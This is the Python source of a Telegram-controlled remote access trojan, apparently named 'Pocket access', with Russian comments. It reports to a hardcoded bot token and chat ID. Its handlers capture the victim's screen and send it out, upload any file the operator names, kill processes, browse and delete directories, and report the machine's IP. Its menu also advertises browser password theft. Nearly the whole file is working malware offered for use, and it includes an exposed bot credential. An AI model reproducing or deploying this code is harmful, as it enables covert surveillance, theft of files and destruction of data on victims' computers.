import telebot # Для работы с ботом
import os # Для работы с директориями / файлами
import requests # Для отправки документов / скринов
from PIL import ImageGrab # Для получения скриншота
import shutil # Для копирования файлов Login Data
import subprocess # Для завершения процесса
import platform # Для получения информации о ПК
import webbrowser # Для открытия ссылки в браузере
import socket
from telebot import types

bot_token = "5658659173:AAHvR-fKpxmjEjWZdiWCA5pO2ANeJaZFSQE" # Токен от бота
chat_id = "888929480" # ID чата

bot = telebot.TeleBot(bot_token)

requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Pocket access Online")

@bot.message_handler(commands=['start', 'Start']) # Ждём команды Start / start
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/Screen", "/ip", "/kill_process", "/Pwd", "/passwords chrome",
            "/passwords opera", "/Open_url", "/Ls", "/Rm_dir", "/download_file", "/About"]

    for btn in btns:
        rmk.add(types.KeyboardButton(btn))

    bot.send_message(chat_id, "Выберите действие:", reply_markup=rmk)

@bot.message_handler(commands=['screen', 'Screen']) # Ждём команды
def send_screen(command) :
    bot.send_message(chat_id, "Wait...") # Отправляем сообщение "Wait..."
    screen = ImageGrab.grab() # Создаём переменную, которая равна получению скриншота
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') # Сохраняем скриншот в папку AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') # Обновляем переменную
    files = {'photo': screen} # Создаём переменную для отправки POST запросом
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) # Делаем запрос

@bot.message_handler(commands=['ip'])
def check_start(message):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("17.13.109.124", 80))
    print(s.getsockname()[0])
    bot.send_message(message.chat.id, 'Ip: ' + s.getsockname()[0])
    s.close()

@bot.message_handler(commands=['pwd', 'Pwd']) # ДИРЕКТОРИЯ
def pwd(command) :
    directory = os.path.abspath(os.getcwd()) # Получаем расположение
    bot.send_message(chat_id, "Текущая дериктория: \n" + (str(directory))) # Отправляем сообщение

@bot.message_handler(commands=["kill_process", "Kill_process"]) # ПРОЦЕССЫ
def kill_process(message):
    user_msg = "{0}".format(message.text) # Переменная в которой содержится сообщение
    subprocess.call("taskkill /IM " + user_msg.split(" ")[1]) # Убиваем процесс по имени
    bot.send_message(chat_id, "Готово!")

@bot.message_handler(commands=["ls", "Ls"]) # ВСЕ ФАЙЛЫ
def ls_dir(commands):
    dirs = '\n'.join(os.listdir(path=".")) # Обявим переменную dirs, в которой содержатся все папки и файлы.
    bot.send_message(chat_id, "Files: " + "\n" + dirs)

@bot.message_handler(commands=["cd", "Cd"]) # ПЕРЕЙТИ В ПАПКУ
def cd_dir(message):
    user_msg = "{0}".format(message.text)
    path2 = user_msg.split(" ")[1] # Переменная - папка
    os.chdir(path2) # Меняем директорию
    bot.send_message(chat_id, "Директория изменена на " + path2)


@bot.message_handler(commands=['download_file'])
def download_file_info(message):
    msg = bot.send_message(message.chat.id, 'Введи директорию на файл, например: C:/brawl/brawl.mp4')
    bot.register_next_step_handler(msg, download_file)


def download_file(message):
    try:

        dire = message.text
        data = open(dire, 'rb')
        size = os.path.getsize(dire)
        if (size > 52428800):
            size_mb = int((size / 1024) / 1024)
            bot.send_message(message.chat.id,
                             'Этот файл больше 50 мб! его не удатся скачать( А вернее ' + str(size_mb) + 'мб')
        else:
            bot.send_document(message.chat.id, data)
            data.close()
    except:
        bot.send_message(message.chat.id, 'Даун, такого файла нет')

@bot.message_handler(commands = ["Rm_dir", "rm_dir"]) # УДАЛИТЬ ПАПКУ
def delete_dir(message):
    user_msg = "{0}".format(message.text)
    path2del = user_msg.split(" ")[1] # Переменная - имя папка
    os.removedirs(path2del) # Удаляем папку
    bot.send_message(chat_id, "Директория " + path2del + " удалена")

@bot.message_handler(commands = ["About", "about"]) # ОПИСАНИЕ
def about(commands):
    bot.send_message(chat_id, "https://github.com/Dimitrescuu/60012")

bot.polling()
